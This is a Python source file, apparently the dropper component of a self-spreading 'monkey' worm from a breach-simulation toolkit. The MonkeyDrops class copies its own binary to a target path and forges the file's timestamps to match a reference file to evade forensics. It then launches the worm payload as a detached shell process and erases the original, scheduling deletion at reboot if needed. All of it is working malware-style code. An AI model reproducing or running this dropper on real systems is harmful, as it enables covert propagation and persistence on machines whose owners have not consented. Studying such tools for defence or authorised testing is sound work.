
import os
import sys
import time
import ctypes
import shutil
import pprint
import logging
import subprocess
from ctypes import c_char_p
from control import ControlClient
from model import MONKEY_CMDLINE
from config import WormConfiguration

if "win32" == sys.platform:
    from win32process import DETACHED_PROCESS
else:
    DETACHED_PROCESS = 0

__author__ = 'itamar'

LOG = logging.getLogger(__name__)

MOVEFILE_DELAY_UNTIL_REBOOT = 4

class MonkeyDrops(object):
    def __init__(self, args):
        if args:
            dest_path = os.path.expandvars(args[0])
        else:
            dest_path = os.path.expandvars(WormConfiguration.dropper_target_path if sys.platform == "win32" \
                                            else WormConfiguration.dropper_target_path_linux)

        self._monkey_args = args[1:]

        self._config = {'source_path': os.path.abspath(sys.argv[0]),
                        'destination_path': args[0]}

    def initialize(self):
        LOG.debug("Dropper is running with config:\n%s", pprint.pformat(self._config))

    def start(self):
        # we copy/move only in case path is different
        file_moved = (self._config['source_path'].lower() == self._config['destination_path'].lower())

        # first try to move the file
        if not file_moved and WormConfiguration.dropper_try_move_first:
            try:
                shutil.move(self._config['source_path'],
                            self._config['destination_path'])

                LOG.info("Moved source file '%s' into '%s'",
                          self._config['source_path'], self._config['destination_path'])

                file_moved = True
            except (WindowsError, IOError, OSError), exc:
                LOG.debug("Error moving source file '%s' into '%s': %s",
                          self._config['source_path'], self._config['destination_path'],
                          exc)

        # if file still need to change path, copy it
        if not file_moved:
            try:
                shutil.copy(self._config['source_path'],
                            self._config['destination_path'])

                LOG.info("Copied source file '%s' into '%s'",
                          self._config['source_path'], self._config['destination_path'])
            except (WindowsError, IOError, OSError), exc:
                LOG.error("Error copying source file '%s' into '%s': %s",
                          self._config['source_path'], self._config['destination_path'],
                          exc)

                return False

        if WormConfiguration.dropper_set_date:
            try:
                ref_stat = os.stat(WormConfiguration.dropper_date_reference_path)
            except:
                LOG.warn("Cannot set reference date using '%s', file not found",
                         WormConfiguration.dropper_date_reference_path)
            else:
                try:
                    os.utime(self._config['destination_path'],
                             (ref_stat.st_atime, ref_stat.st_mtime))
                except:
                    LOG.warn("Cannot set reference date to destination file")

        monkey_cmdline = MONKEY_CMDLINE % {'monkey_path': self._config['destination_path'],
                                           }

        if 0 != len(self._monkey_args):
            monkey_cmdline = "%s %s" % (monkey_cmdline, " ".join(self._monkey_args))
        monkey_process = subprocess.Popen(monkey_cmdline, shell=True,
                                          stdin=None, stdout=None, stderr=None,
                                          close_fds=True, creationflags=DETACHED_PROCESS)

        LOG.info("Executed monkey process (PID=%d) with command line: %s",
                 monkey_process.pid, monkey_cmdline)

        time.sleep(3)
        if monkey_process.poll() is not None:
            LOG.warn("Seems like monkey died too soon")

    def cleanup(self):
        if (self._config['source_path'].lower() != self._config['destination_path'].lower()) and \
                os.path.exists(self._config['source_path']) and \
                WormConfiguration.dropper_try_move_first:

            # try removing the file first
            try:
                os.remove(self._config['source_path'])
            except Exception, exc:
                LOG.debug("Error removing source file '%s': %s",
                      self._config['source_path'], exc)

                # mark the file for removal on next boot
                dropper_source_path_ctypes = c_char_p(self._config['source_path'])
                if 0 == ctypes.windll.kernel32.MoveFileExA( dropper_source_path_ctypes, None,
                                                            MOVEFILE_DELAY_UNTIL_REBOOT):
                    LOG.debug("Error marking source file '%s' for deletion on next boot (error %d)",
                              self._config['source_path'], ctypes.windll.kernel32.GetLastError())
                else:
                    LOG.debug("Dropper source file '%s' is marked for deletion on next boot",
                              self._config['source_path'])